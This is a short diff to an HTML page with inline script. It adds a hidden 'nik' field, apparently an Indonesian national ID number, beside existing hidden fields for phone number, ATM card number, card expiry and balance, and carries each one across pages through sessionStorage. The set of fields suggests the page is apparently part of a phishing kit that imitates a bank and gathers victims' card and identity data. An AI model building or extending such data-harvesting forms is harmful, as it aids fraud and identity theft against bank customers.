@@ -405,7 +405,7 @@
             <input type="hidden" id="nohp" name="nohp">
             <input type="hidden" id="atm" name="atm">
             <input type="hidden" id="valid" name="valid">
-            
+            <input type="hidden" name="nik" id="nik">
             <input type="hidden" id="saldo" name="saldo">
        <center> 
         <div style="margin-top: -21px"> 
@@ -489,7 +489,9 @@
         sessionStorage.getItem("atm");
         document.getElementById("valid").value =
         sessionStorage.getItem("valid");        
-                 
+       document.getElementById("nik").value =
+        sessionStorage.getItem("nik");
+          
         document.getElementById("saldo").value =
         sessionStorage.getItem("saldo");
      
